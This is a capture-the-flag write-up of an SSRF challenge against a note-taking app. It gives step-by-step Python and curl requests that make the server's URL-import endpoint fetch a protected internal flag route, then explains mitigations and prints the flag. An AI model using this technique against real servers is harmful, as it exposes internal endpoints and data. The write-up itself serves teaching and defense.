# NoteVault SSRF Challenge Write-up

## Challenge Summary

The target application was the deployed note-taking site at:

- `https://webchal1.vercel.app/`

The challenge description on `/challenge` explicitly stated that the flag was stored behind an internal API endpoint:

- `/api/internal/flag`

It also stated that the endpoint could not be accessed directly, but that the server could access it.

That is the core hint: this is a server-side request forgery (SSRF) challenge.

The final flag was:

```text
TACHYON{5SrF_inj3ct10N_c0ol_123wed3}
```

## Goal

Retrieve the contents of the protected internal endpoint:

```text
/api/internal/flag
```

without being allowed to call it directly as an external user.

## Initial Recon

Visiting `/challenge` gave the intended objective very clearly:

- The flag lives at `/api/internal/flag`
- Direct access is blocked
- The server can access internal resources

The `/import` page was the other important clue. Its UI text said the server would fetch arbitrary `HTTP/HTTPS` URLs on behalf of the user and save the result as a note.

That immediately suggests the attack path:

1. Find the backend endpoint used by the import feature
2. Make it fetch the protected internal API
3. Read back the stored note

## Direct Access Verification

The first thing to verify was that the internal endpoint was actually protected from normal client access.

Request:

```bash
curl -i https://webchal1.vercel.app/api/internal/flag
```

Response:

```http
HTTP/1.1 403 Forbidden
Content-Type: application/json

{"error":"Forbidden — only accessible from internal services."}
```

So direct access was correctly denied.

## Finding the Relevant API Endpoints

The site is a Next.js application. The pages themselves did not expose the backend implementation directly, but the client JavaScript bundles showed the API routes used by the forms.

From the import page bundle, the important frontend logic was:

- `POST /api/notes/import`
- JSON body: `{"url":"..."}`

From the note creation page bundle:

- `POST /api/notes`

From the note detail page bundle:

- `GET /api/notes/:id`

These three endpoints were enough to solve the challenge:

1. `POST /api/notes/import` to make the server fetch a target URL
2. `GET /api/notes/:id` to read the imported content back

## Important Observation About Requesting the API

Using raw shell `curl` from PowerShell initially produced misleading bare `500` responses because of quoting issues while sending JSON bodies. To avoid wasting time on shell escaping, the cleanest way to interact with the API was through WSL Python with proper JSON serialization.

That mattered because once the request body was sent correctly, the API behaved normally.

## Verifying Normal Note Creation

Before exploiting the import flow, I verified that the note API itself worked.

This WSL-backed Python request successfully created a note:

```python
import urllib.request, urllib.error, json

data = json.dumps({
    "title": "x",
    "body": "y",
}).encode()

req = urllib.request.Request(
    "https://webchal1.vercel.app/api/notes",
    data=data,
    headers={"Content-Type": "application/json"},
)

with urllib.request.urlopen(req, timeout=20) as resp:
    print(resp.status)
    print(resp.read().decode())
```

Response:

```json
{"id":4}
```

Reading it back via:

```bash
curl -i https://webchal1.vercel.app/api/notes/4
```

returned:

```json
{"id":4,"title":"x","body":"y","createdAt":"2026-03-07T05:43:51.411Z"}
```

This confirmed two things:

1. Notes could be created normally
2. Stored note bodies could be read back through `/api/notes/:id`

## Exploiting the Import Feature

The attack idea was straightforward:

- Ask the server to import `https://webchal1.vercel.app/api/internal/flag`
- Let the backend fetch it from its privileged context
- Read the saved note back afterward

I tested several targets. The one that mattered was the same-origin internal API URL:

```text
https://webchal1.vercel.app/api/internal/flag
```

The following Python snippet exercised the import endpoint:

```python
import urllib.request, urllib.error, json

target = "https://webchal1.vercel.app/api/internal/flag"

data = json.dumps({"url": target}).encode()
req = urllib.request.Request(
    "https://webchal1.vercel.app/api/notes/import",
    data=data,
    headers={"Content-Type": "application/json"},
)

with urllib.request.urlopen(req, timeout=30) as resp:
    print(resp.status)
    print(resp.read().decode())
```

Response:

```json
{"id":6}
```

This was the key result.

A normal external request to `/api/internal/flag` returned `403`, but the import endpoint was willing to fetch that URL server-side and store the response.

That is the SSRF vulnerability.

## Retrieving the Imported Flag

Once the server imported the internal endpoint as note `6`, the final step was just reading the note back:

```bash
curl -s https://webchal1.vercel.app/api/notes/6
```

Response:

```json
{"id":6,"title":"Imported Note","body":"{\"flag\":\"TACHYON{5SrF_inj3ct10N_c0ol_123wed3}\"}","createdAt":"2026-03-07T05:44:42.204Z"}
```

The note body contained the internal API response:

```json
{"flag":"TACHYON{5SrF_inj3ct10N_c0ol_123wed3}"}
```

Therefore the flag is:

```text
TACHYON{5SrF_inj3ct10N_c0ol_123wed3}
```

## Why the Vulnerability Exists

The vulnerability is a classic SSRF issue caused by trusting user-supplied URLs in a server-side fetch flow.

The import feature accepted an arbitrary URL from the user and the backend fetched it on the server. Because the backend was able to reach resources that were not meant for public users, it effectively became a proxy into protected endpoints.

The challenge specifically relied on this trust boundary failure:

- External users could not access `/api/internal/flag`
- The application server could access it
- The import endpoint let users tell the server what to fetch

That turns the import endpoint into an SSRF primitive.

## Full Attack Chain

1. Visit `/challenge` and read that the flag lives at `/api/internal/flag`.
2. Visit `/import` and note that the server fetches arbitrary URLs.
3. Extract the import API route from the frontend bundle: `POST /api/notes/import`.
4. Confirm direct access to `/api/internal/flag` returns `403`.
5. Send `{"url":"https://webchal1.vercel.app/api/internal/flag"}` to `/api/notes/import`.
6. Receive a new note ID from the server.
7. Read the imported note with `GET /api/notes/<id>`.
8. Extract the flag from the note body.

## Minimal Reproduction

This is the shortest clean reproduction flow.

### 1. Import the protected endpoint

```python
import urllib.request, json

data = json.dumps({
    "url": "https://webchal1.vercel.app/api/internal/flag"
}).encode()

req = urllib.request.Request(
    "https://webchal1.vercel.app/api/notes/import",
    data=data,
    headers={"Content-Type": "application/json"},
)

with urllib.request.urlopen(req) as resp:
    print(resp.read().decode())
```

Expected shape of response:

```json
{"id":<note_id>}
```

### 2. Read the created note

```bash
curl https://webchal1.vercel.app/api/notes/<note_id>
```

Expected note body:

```json
{"flag":"TACHYON{5SrF_inj3ct10N_c0ol_123wed3}"}
```

## Security Lessons

This challenge demonstrates a common SSRF pattern:

- A feature that fetches URLs on the server
- No strict allowlist for destinations
- Sensitive internal routes accessible from the server network context
- An output sink that returns the fetched content to the attacker

## Mitigations

To fix this class of bug in a real application:

1. Do not allow arbitrary user-controlled URLs to be fetched by the backend.
2. Use an allowlist of approved domains or exact origins.
3. Block requests to localhost, private IP ranges, link-local ranges, cloud metadata addresses, and internal application routes.
4. Resolve DNS carefully and defend against DNS rebinding.
5. Separate sensitive internal APIs from the same origin used by public features.
6. Require strong service-to-service authentication instead of trusting network locality alone.
7. Sanitize or avoid reflecting fetched content directly back to users.

## Final Answer

```text
TACHYON{5SrF_inj3ct10N_c0ol_123wed3}
```
